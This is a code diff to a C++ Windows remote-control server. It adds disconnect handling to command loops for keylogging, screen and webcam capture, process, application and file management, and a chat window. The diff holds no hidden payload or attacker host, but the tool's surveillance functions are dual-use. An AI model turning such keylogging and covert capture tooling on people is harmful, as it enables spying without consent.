@@ -79,16 +79,16 @@ void sendLine(const string &s)
     send(clientSocket, msg.c_str(), msg.length(), 0);
 }
 
-string receiveLine()
-{
+string receiveLine() {
     string result;
     char c;
-    while (recv(clientSocket, &c, 1, 0) > 0)
-    {
-        if (c == '\n')
-            break;
-        if (c != '\r')
-            result += c;
+    while (true) {
+        int bytesReceived = recv(clientSocket, &c, 1, 0);
+        if (bytesReceived <= 0) {
+            return "EXIT_SIGNAL"; 
+        }
+        if (c == '\n') break;
+        if (c != '\r') result += c;
     }
     return result;
 }
@@ -375,6 +375,11 @@ void keylog()
     while (true)
     {
         receiveSignal(s);
+        if (s == "EXIT_SIGNAL" || s == "QUIT" || s == "")
+        {
+            unhookKey();
+            break;
+        }
         if (s == "PRINT")
             printkeys();
         else if (s == "HOOK")
@@ -399,6 +404,10 @@ void takepic()
     while (true)
     {
         receiveSignal(ss);
+        if (ss == "EXIT_SIGNAL" || ss == "QUIT" || ss == "")
+        {
+            return;
+        }
         if (ss == "TAKE")
         {
             HDC hdcScreen = GetDC(NULL);
@@ -502,6 +511,10 @@ void processManagement()
     while (true)
     {
         receiveSignal(ss);
+        if (ss == "EXIT_SIGNAL" || ss == "QUIT" || ss == "")
+        {
+            return;
+        }
 
         if (ss == "XEM")
         {
@@ -542,6 +555,11 @@ void processManagement()
             while (test)
             {
                 receiveSignal(ss);
+                if (ss == "EXIT_SIGNAL" || ss == "QUIT" || ss == "")
+                {
+                    unhookKey();
+                    break;
+                }
                 if (ss == "KILLID")
                 {
                     string pidStr = receiveLine();
@@ -577,6 +595,11 @@ void processManagement()
             while (test)
             {
                 receiveSignal(ss);
+                if (ss == "EXIT_SIGNAL" || ss == "QUIT" || ss == "")
+                {
+                    unhookKey();
+                    break;
+                }
                 if (ss == "STARTID")
                 {
                     string exeName = receiveLine();
@@ -746,6 +769,10 @@ void applicationManagement()
     while (true)
     {
         receiveSignal(ss);
+        if (ss == "EXIT_SIGNAL" || ss == "QUIT" || ss == "")
+        {
+            return;
+        }
         if (ss == "XEM")
         {
             vector<AppInfo> apps;
@@ -768,6 +795,11 @@ void applicationManagement()
             while (test)
             {
                 receiveSignal(ss);
+                if (ss == "EXIT_SIGNAL" || ss == "QUIT" || ss == "")
+                {
+                    unhookKey();
+                    break;
+                }
                 if (ss == "KILLID")
                 {
                     string pidStr = receiveLine();
@@ -803,6 +835,11 @@ void applicationManagement()
             while (test)
             {
                 receiveSignal(ss);
+                if (ss == "EXIT_SIGNAL" || ss == "QUIT" || ss == "")
+                {
+                    unhookKey();
+                    break;
+                }
                 if (ss == "STARTID")
                 {
                     string inputName = receiveLine();
@@ -916,6 +953,11 @@ void webcam()
     while (true)
     {
         receiveSignal(cmd);
+        if (cmd == "EXIT_SIGNAL" || cmd == "QUIT" || cmd == "")
+        {
+            isRecording = false;
+            return;
+        }
 
         if (cmd == "START")
         {
@@ -1022,6 +1064,10 @@ void fileManagement()
     while (true)
     {
         receiveSignal(cmd);
+        if (cmd == "EXIT_SIGNAL" || cmd == "QUIT" || cmd == "")
+        {
+            break;
+        }
 
         if (cmd == "LIST")
         {
@@ -1345,6 +1391,12 @@ void chatModule()
     while (true)
     {
         receiveSignal(cmd);
+        if (cmd == "EXIT_SIGNAL" || cmd == "QUIT" || cmd == "")
+        {
+            if (hChatWnd)
+                ShowWindow(hChatWnd, SW_HIDE);
+            return;
+        }
 
         if (cmd == "START")
         {
@@ -1383,6 +1435,11 @@ void processClient(SOCKET client)
     while (true)
     {
         receiveSignal(s);
+        if (s == "EXIT_SIGNAL" || s == "QUIT" || s == "")
+        {
+            unhookKey();
+            break;
+        }
         if (s == "KEYLOG")
         {
             keylog();
@@ -1434,6 +1491,8 @@ void processClient(SOCKET client)
             break;
         }
     }
+    closesocket(clientSocket);
+    clientSocket = INVALID_SOCKET;
     cout << "Client disconnected." << endl;
 }
 
